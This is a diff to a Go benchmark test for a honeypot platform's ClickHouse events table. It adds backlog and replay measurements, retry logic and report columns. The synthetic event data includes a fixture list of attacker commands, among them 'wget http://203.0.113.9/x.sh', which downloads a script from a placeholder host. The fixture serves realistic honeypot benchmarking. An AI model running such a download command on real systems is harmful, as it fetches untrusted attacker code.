@@ -7,6 +7,7 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"io"
 	"net/http"
@@ -19,6 +20,8 @@ import (
 	"syscall"
 	"testing"
 	"time"
+
+	"github.com/ClickHouse/clickhouse-go/v2"
 )
 
 // The database benchmark: how a real instance behaves as its events table
@@ -35,7 +38,12 @@ import (
 //     dashboard polls, every ten seconds, while the collector stores the live
 //     traffic and the intelligence worker classifies it;
 //   - records what each API call took, how far the worker fell behind, what
-//     the database used, the queries that cost most and any it refused.
+//     the database used, the queries that cost most and any it refused;
+//   - then measures the worker at its limit: QPOT_BENCH_BACKLOG new events
+//     (30,000 by default) stored at once, and how fast they are classified;
+//   - and what a collector that lost its place costs: QPOT_BENCH_REPLAYS
+//     classified events of the history (200,000 by default) sent again with
+//     the IDs they have, and how long until no second copy is left.
 //
 // QPOT_SOAK=1 QPOT_BENCH=1 QPOT_SOAK_BIN=/tmp/qpot QPOT_SOAK_RATE=5 \
 //     QPOT_BENCH_SIZES=1000000,5000000,10000000 QPOT_BENCH_STAGE=8m \
@@ -58,6 +66,12 @@ const (
 	// benchFillChunk is how many history rows one INSERT ... SELECT adds: a
 	// few blocks at a time, as a collector that catches up would send them.
 	benchFillChunk = 250_000
+	// benchPhaseMost bounds each of the backlog and replay measurements.
+	benchPhaseMost = 90 * time.Minute
+	// benchIDHalves and benchObservationID make a version 8 UUID, the kind
+	// of ID the collector gives an event, from a row number and a seed.
+	benchIDHalves      = `lower(leftPad(hex(cityHash64(number, ?, 20)), 16, '0')) AS h1, lower(leftPad(hex(cityHash64(number, ?, 21)), 16, '0')) AS h2`
+	benchObservationID = `toUUID(concat(substring(h1, 1, 8), '-', substring(h1, 9, 4), '-8', substring(h1, 14, 3), '-8', substring(h2, 2, 3), '-', substring(h2, 5, 12)))`
 )
 
 // benchCall is what one endpoint cost over a stage.
@@ -113,6 +127,31 @@ type benchStage struct {
 	Healthy          bool         `json:"healthy_at_end"`
 	HealthNote       string       `json:"health_note,omitempty"`
 	MutationsWaiting uint64       `json:"mutations_unfinished_max"`
+	Backlog          benchBacklog `json:"backlog"`
+	Replay           benchReplay  `json:"replay"`
+}
+
+// benchBacklog is the worker at its limit: Events stored at once, the
+// seconds until the first of them was classified (the worker waits for its
+// next pass) and from then until the last, and the rate in between.
+type benchBacklog struct {
+	Events        uint64  `json:"events"`
+	StartSeconds  float64 `json:"seconds_to_first_classified"`
+	DrainSeconds  float64 `json:"seconds_first_to_last"`
+	PerSecond     float64 `json:"classified_per_second"`
+	LeftAtTimeout uint64  `json:"left_unclassified_at_timeout"`
+}
+
+// benchReplay is a collector that lost its place: Copies rows of classified
+// history stored again with their IDs, the seconds until the first copy was
+// removed and until the last, and what was found at the end.
+type benchReplay struct {
+	Copies          uint64  `json:"copies"`
+	FirstSeconds    float64 `json:"seconds_to_first_removed"`
+	ClearedSeconds  float64 `json:"seconds_to_all_removed"`
+	LeftAtTimeout   uint64  `json:"copies_left_at_timeout"`
+	OriginalsLeft   uint64  `json:"originals_left"`
+	StoredTwiceLeft uint64  `json:"ids_stored_twice_at_end"`
 }
 
 type benchReport struct {
@@ -143,6 +182,14 @@ func TestDatabaseBench(t *testing.T) {
 	browsers, err := strconv.Atoi(env("QPOT_BENCH_BROWSERS", "2"))
 	if err != nil || browsers < 1 || browsers > 50 {
 		t.Fatalf("QPOT_BENCH_BROWSERS: %q is not a number from 1 to 50", os.Getenv("QPOT_BENCH_BROWSERS"))
+	}
+	backlog, err := strconv.ParseUint(env("QPOT_BENCH_BACKLOG", "30000"), 10, 64)
+	if err != nil || backlog > 5_000_000 {
+		t.Fatalf("QPOT_BENCH_BACKLOG: %q is not a number of events up to 5 million (0 skips it)", os.Getenv("QPOT_BENCH_BACKLOG"))
+	}
+	replays, err := strconv.ParseUint(env("QPOT_BENCH_REPLAYS", "200000"), 10, 64)
+	if err != nil || replays > 5_000_000 {
+		t.Fatalf("QPOT_BENCH_REPLAYS: %q is not a number of rows up to 5 million (0 skips it)", os.Getenv("QPOT_BENCH_REPLAYS"))
 	}
 
 	tag := make([]byte, 4)
@@ -177,7 +224,8 @@ func TestDatabaseBench(t *testing.T) {
 	}
 
 	rep := benchReport{Tag: h.tag, Options: map[string]any{"rate_per_second": opt.rate, "stage": stageFor.String(),
-		"browsers": browsers, "history_days": benchHistoryDays, "binary": filepath.Base(opt.bin)}}
+		"browsers": browsers, "history_days": benchHistoryDays, "binary": filepath.Base(opt.bin),
+		"backlog": backlog, "replays": replays}}
 	if out, err := h.qpot(ctx, time.Minute, "--version"); err == nil {
 		rep.Options["version"] = strings.TrimSpace(out)
 	}
@@ -185,6 +233,23 @@ func TestDatabaseBench(t *testing.T) {
 		st := h.benchStage(ctx, size, stageFor, browsers)
 		rep.Stages = append(rep.Stages, st)
 		h.benchWrite(rep)
+		if backlog > 0 {
+			st.Backlog = h.benchBacklog(ctx, backlog)
+			rep.Stages[len(rep.Stages)-1] = st
+			h.benchWrite(rep)
+			if st.Backlog.LeftAtTimeout != 0 {
+				t.Errorf("%d events: %d of a backlog of %d were still unclassified after %s", size, st.Backlog.LeftAtTimeout, backlog, benchPhaseMost)
+			}
+		}
+		if replays > 0 {
+			st.Replay = h.benchReplay(ctx, replays)
+			rep.Stages[len(rep.Stages)-1] = st
+			h.benchWrite(rep)
+			if r := st.Replay; r.LeftAtTimeout != 0 || r.StoredTwiceLeft != 0 || r.OriginalsLeft != r.Copies {
+				t.Errorf("%d events: after %d rows were sent again, %d copies were left at the timeout, %d IDs stored twice at the end, %d of %d originals left",
+					size, r.Copies, r.LeftAtTimeout, r.StoredTwiceLeft, r.OriginalsLeft, r.Copies)
+			}
+		}
 		if st.MemoryRefusals != 0 {
 			t.Errorf("%d events: the database refused %d queries for lack of memory", size, st.MemoryRefusals)
 		}
@@ -231,10 +296,16 @@ func (h *harness) benchFill(ctx context.Context, rows uint64) (added uint64, too
 		// This chunk covers its own slice of the 60 days, oldest first.
 		from := end - span + int64(float64(span)*float64(done)/float64(need))
 		width := max(int64(float64(span)*float64(n)/float64(need)), 1)
-		qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
-		err := h.db.Exec(qctx, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
-				username, password, command, payload, metadata, country, technique_id, technique_name, tactic_id, tactic_name,
-				kill_chain_stage, confidence, classified, categories)
+		// Each row has an ID of the collector's kind (version 8, see
+		// database.IsObservationID) and the set of classified IDs holds it,
+		// as if the worker had classified it, so that a copy of it sent
+		// again is recognised as one. asn marks the history.
+		err := h.benchRetry(ctx, func(qctx context.Context) error {
+			return h.db.Exec(qctx, `DELETE FROM events WHERE asn = 'bench-history'
+				AND timestamp >= fromUnixTimestamp64Milli(?) AND timestamp < fromUnixTimestamp64Milli(?)`, from, from+width)
+		}, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
+				username, password, command, payload, metadata, country, asn, technique_id, technique_name, tactic_id, tactic_name,
+				kill_chain_stage, confidence, classified, categories, event_id)
 			SELECT fromUnixTimestamp64Milli(toInt64(? + intDiv(number * ?, ?))),
 				['dionaea','conpot','heralding','honeytrap','ciscoasa','mailoney'][1 + cityHash64(number, ?, 3) % 6],
 				IPv4NumToString(toUInt32(if(cityHash64(number, ?, 1) % 10 < 4, 754974720 + cityHash64(number, ?, 2) % 400, 16777216 + cityHash64(number, ?, 2) % 3000000000))),
@@ -244,14 +315,20 @@ func (h *harness) benchFill(ctx context.Context, rows uint64) (added uint64, too
 				if(cityHash64(number, ?, 7) % 4 = 0, ['uname -a','cat /proc/cpuinfo','wget http://203.0.113.9/x.sh','id','ls -la /tmp'][1 + cityHash64(number, ?, 8) % 5], ''),
 				if(cityHash64(number, ?, 11) % 3 = 0, randomPrintableASCII(200), ''),
 				map('session', hex(cityHash64(number, ?, 12) % 2000000), 'version', 'SSH-2.0-libssh_0.9.6'),
-				['CN','US','RU','DE','NL','BR','IN','VN','KR','FR'][1 + cityHash64(number, ?, 13) % 10],
+				['CN','US','RU','DE','NL','BR','IN','VN','KR','FR'][1 + cityHash64(number, ?, 13) % 10], 'bench-history',
 				['T1110','T1082','T1105','T1595',''][1 + cityHash64(number, ?, 14) % 5], 'Technique', 'TA0006', 'Credential Access',
-				'exploitation', 0.8, 1, ['Brute force']
-			FROM numbers(?) SETTINGS max_insert_threads = 1, max_threads = 1, max_block_size = 65536`,
-			from, width, n, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, n)
-		cancel()
+				'exploitation', 0.8, 1, ['Brute force'], `+benchObservationID+`
+			FROM (SELECT number, `+benchIDHalves+` FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1, max_block_size = 65536`,
+			from, width, n, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, n)
 		if err != nil {
 			t.Fatalf("fill the events table (%d of %d rows added): %v", done, need, err)
+		}
+		// Adding an ID twice changes nothing, so this is repeated as it is.
+		err = h.benchRetry(ctx, nil, `INSERT INTO classified_event_ids (event_id) SELECT event_id FROM events
+			WHERE timestamp >= fromUnixTimestamp64Milli(?) AND timestamp < fromUnixTimestamp64Milli(?) AND asn = 'bench-history'
+			SETTINGS max_insert_threads = 1, max_threads = 1`, from, from+width)
+		if err != nil {
+			t.Fatalf("record the history's IDs as classified (%d of %d rows added): %v", done, need, err)
 		}
 		done += n
 		seed++
@@ -279,6 +356,187 @@ func (h *harness) benchFill(ctx context.Context, rows uint64) (added uint64, too
 			now64(3) - toIntervalDay(20), now64(3) - toIntervalSecond(number % 1728000), 0.7
 		FROM (SELECT number + ? AS number FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1`, rows/100)
 	return need, time.Since(start)
+}
+
+// benchRetry runs a statement of the fill, and when the database refuses it
+// for lack of memory (its merges hold memory too) runs undo, waits, and
+// tries again: a refused INSERT ... SELECT may have stored some of its
+// blocks.
+func (h *harness) benchRetry(ctx context.Context, undo func(context.Context) error, query string, args ...any) error {
+	wait := 10 * time.Second
+	for attempt := 1; ; attempt++ {
+		qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
+		err := h.db.Exec(qctx, query, args...)
+		cancel()
+		var ex *clickhouse.Exception
+		if err == nil || !errors.As(err, &ex) || ex.Code != 241 || attempt == 6 {
+			return err
+		}
+		h.logf("  the database refused a fill statement for lack of memory (attempt %d); trying again in %s", attempt, wait)
+		time.Sleep(wait)
+		if undo != nil {
+			qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
+			err := undo(qctx)
+			cancel()
+			if err != nil {
+				return fmt.Errorf("undo a refused fill statement: %w", err)
+			}
+		}
+		wait *= 2
+	}
+}
+
+// count runs a count query, trying again for a minute when it fails, so a
+// failed query is never read as zero rows.
+func (h *harness) count(ctx context.Context, query string, args ...any) (uint64, error) {
+	return h.countWithin(ctx, 30*time.Second, query, args...)
+}
+
+// countWithin is count for a query that may take up to limit: the
+// connection's own limit (max_execution_time) is raised to match.
+func (h *harness) countWithin(ctx context.Context, limit time.Duration, query string, args ...any) (uint64, error) {
+	var err error
+	ctx = clickhouse.Context(ctx, clickhouse.WithSettings(clickhouse.Settings{"max_execution_time": int(limit.Seconds())}))
+	for deadline := time.Now().Add(time.Minute); ; time.Sleep(2 * time.Second) {
+		qctx, cancel := context.WithTimeout(ctx, limit)
+		var n uint64
+		err = h.db.QueryRow(qctx, query, args...).Scan(&n)
+		cancel()
+		if err == nil {
+			return n, nil
+		}
+		if time.Now().After(deadline) || ctx.Err() != nil {
+			return 0, err
+		}
+	}
+}
+
+// benchBacklog stores n new events at once, unclassified, from 400
+// addresses over the last 20 minutes, and measures how fast the worker
+// classifies them: from the last look that found none of them classified to
+// the first that found all, so the rate is never overstated.
+func (h *harness) benchBacklog(ctx context.Context, n uint64) benchBacklog {
+	t := h.t
+	b := benchBacklog{Events: n}
+	h.logf("  backlog: %d new events stored at once", n)
+	seed := time.Now().UnixNano()
+	qctx, cancel := context.WithTimeout(ctx, 10*time.Minute)
+	err := h.db.Exec(qctx, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
+			username, password, command, payload, metadata, country, asn, event_id)
+		SELECT now64(3) - toIntervalMillisecond(1200000 - intDiv(number * 1200000, ?)),
+			['dionaea','conpot','heralding','honeytrap','ciscoasa','mailoney'][1 + cityHash64(number, ?, 3) % 6],
+			IPv4NumToString(toUInt32(754974720 + cityHash64(number, ?, 2) % 400)),
+			toUInt16(1024 + cityHash64(number, ?, 9) % 60000), [22, 23, 80, 445, 502, 3389][1 + cityHash64(number, ?, 10) % 6],
+			'tcp', ['connection','login.failed','login.success','command.input','session.closed','file.download'][1 + cityHash64(number, ?, 4) % 6],
+			['root','admin','user','test','oracle','ubuntu'][1 + cityHash64(number, ?, 5) % 6], concat('pw', toString(cityHash64(number, ?, 6) % 5000)),
+			if(cityHash64(number, ?, 7) % 4 = 0, ['uname -a','cat /proc/cpuinfo','wget http://203.0.113.9/x.sh','id','ls -la /tmp'][1 + cityHash64(number, ?, 8) % 5], ''),
+			if(cityHash64(number, ?, 11) % 3 = 0, randomPrintableASCII(200), ''),
+			map('session', hex(cityHash64(number, ?, 12) % 2000000), 'version', 'SSH-2.0-libssh_0.9.6'),
+			['CN','US','RU','DE','NL','BR','IN','VN','KR','FR'][1 + cityHash64(number, ?, 13) % 10], 'bench-backlog', `+benchObservationID+`
+		FROM (SELECT number, `+benchIDHalves+` FROM numbers(?)) SETTINGS max_insert_threads = 1, max_threads = 1`,
+		n, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, seed, n)
+	cancel()
+	if err != nil {
+		t.Fatalf("store the backlog: %v", err)
+	}
+	stored := time.Now()
+	lastNone, first := stored, time.Time{}
+	for {
+		left, err := h.count(ctx, `SELECT count() FROM events WHERE classified = 0 AND asn = 'bench-backlog'`)
+		if err != nil {
+			t.Fatalf("count the backlog: %v", err)
+		}
+		now := time.Now()
+		switch {
+		case left >= n:
+			lastNone = now
+		case first.IsZero():
+			first = now
+			b.StartSeconds = now.Sub(stored).Seconds()
+		}
+		if left == 0 {
+			b.DrainSeconds = now.Sub(lastNone).Seconds()
+			b.PerSecond = float64(n) / b.DrainSeconds
+			h.logf("  backlog: first classified after %.0fs, all %d within %.0fs of the worker starting: %.1f events/s",
+				b.StartSeconds, n, b.DrainSeconds, b.PerSecond)
+			return b
+		}
+		if now.Sub(stored) > benchPhaseMost {
+			b.LeftAtTimeout = left
+			h.logf("  backlog: %d of %d still unclassified after %s", left, n, benchPhaseMost)
+			return b
+		}
+		time.Sleep(2 * time.Second)
+	}
+}
+
+// benchReplay sends again, as a collector that lost its place does, about
+// `copies` classified rows of the history: the same rows with the same IDs,
+// unclassified. It measures how long until the first and the last copy are
+// gone, and then checks that every original is still there, once.
+func (h *harness) benchReplay(ctx context.Context, copies uint64) benchReplay {
+	t := h.t
+	var r benchReplay
+	history, err := h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE asn = 'bench-history'`)
+	if err != nil || history == 0 {
+		t.Fatalf("count the history: %d rows, %v", history, err)
+	}
+	// A sample spread over all 60 days: every k-th ID.
+	sample := fmt.Sprintf("asn = 'bench-history' AND cityHash64(event_id) %% %d = 0", max(history/copies, 1))
+	originals, err := h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE `+sample)
+	if err != nil {
+		t.Fatalf("count the sample: %v", err)
+	}
+	qctx, cancel := context.WithTimeout(clickhouse.Context(ctx, clickhouse.WithSettings(clickhouse.Settings{"max_execution_time": 1200})), 20*time.Minute)
+	err = h.db.Exec(qctx, `INSERT INTO events (timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
+			username, password, command, payload, metadata, country, city, asn, event_id)
+		SELECT timestamp, honeypot, source_ip, source_port, dest_port, protocol, event_type,
+			username, password, command, payload, metadata, country, city, asn, event_id
+		FROM events WHERE `+sample+` AND classified = 1
+		SETTINGS max_insert_threads = 1, max_threads = 1, insert_deduplicate = 0`)
+	cancel()
+	if err != nil {
+		t.Fatalf("send the sample again: %v", err)
+	}
+	sent := time.Now()
+	// Every row of the sample was sent once more. (Counting them now would
+	// miss those a worker already removed.)
+	r.Copies = originals
+	h.logf("  replay: %d rows of the history sent again (%d originals in the sample)", r.Copies, originals)
+	for {
+		left, err := h.count(ctx, `SELECT count() FROM events WHERE classified = 0 AND asn = 'bench-history'`)
+		if err != nil {
+			t.Fatalf("count the copies: %v", err)
+		}
+		since := time.Since(sent).Seconds()
+		if left < r.Copies && r.FirstSeconds == 0 {
+			r.FirstSeconds = since
+		}
+		if left == 0 {
+			r.ClearedSeconds = since
+			break
+		}
+		if time.Since(sent) > benchPhaseMost {
+			r.LeftAtTimeout = left
+			break
+		}
+		time.Sleep(5 * time.Second)
+	}
+	r.OriginalsLeft, err = h.countWithin(ctx, 5*time.Minute, `SELECT count() FROM events WHERE `+sample)
+	if err != nil {
+		t.Fatalf("count the sample: %v", err)
+	}
+	if r.OriginalsLeft != originals && r.LeftAtTimeout == 0 {
+		h.logf("  replay: %d rows of the sample at the end, %d before", r.OriginalsLeft, originals)
+	}
+	twice, err := h.countWithin(ctx, 5*time.Minute, `SELECT toUInt64(count() - uniqExact(event_id)) FROM events WHERE `+sample+` SETTINGS max_threads = 1`)
+	if err != nil {
+		t.Fatalf("look for IDs stored twice: %v", err)
+	}
+	r.StoredTwiceLeft = twice
+	h.logf("  replay: first copy removed after %.0fs, all after %.0fs (%d left at the timeout); %d IDs stored twice at the end",
+		r.FirstSeconds, r.ClearedSeconds, r.LeftAtTimeout, twice)
+	return r
 }
 
 // benchGet asks the control plane as the dashboard does and reads the whole
@@ -526,6 +784,11 @@ func (h *harness) benchWrite(r benchReport) {
 	for _, s := range r.Stages {
 		fmt.Fprintf(&b, "| %d | %.0f | %.0f | %d / %d of %d | %d | %.0f | %.0f | %.0f%% | %d | %d |\n", s.Rows, s.TableMB, s.FillRowsPerSec,
 			s.LiveLost, s.LiveTwice, s.LiveAccepted, s.MaxUnclassified, s.ClassifyLagMax, s.MemoryMaxMB, s.CPUThrottledPct, s.MemoryRefusals, s.OtherExceptions)
+	}
+	b.WriteString("\nThe worker at its limit, and a collector that sent rows again:\n\n| Events | Backlog | Classified per second | Seconds to the first | Rows sent again | First copy gone (s) | Last copy gone (s) | Left at the timeout | IDs stored twice at the end |\n|---|---|---|---|---|---|---|---|---|\n")
+	for _, s := range r.Stages {
+		fmt.Fprintf(&b, "| %d | %d | %.1f | %.0f | %d | %.0f | %.0f | %d / %d | %d |\n", s.Rows, s.Backlog.Events, s.Backlog.PerSecond, s.Backlog.StartSeconds,
+			s.Replay.Copies, s.Replay.FirstSeconds, s.Replay.ClearedSeconds, s.Backlog.LeftAtTimeout, s.Replay.LeftAtTimeout, s.Replay.StoredTwiceLeft)
 	}
 	b.WriteString("\nAPI calls, milliseconds (median / 95th percentile / longest; failed of calls):\n\n| Call |")
 	for _, s := range r.Stages {
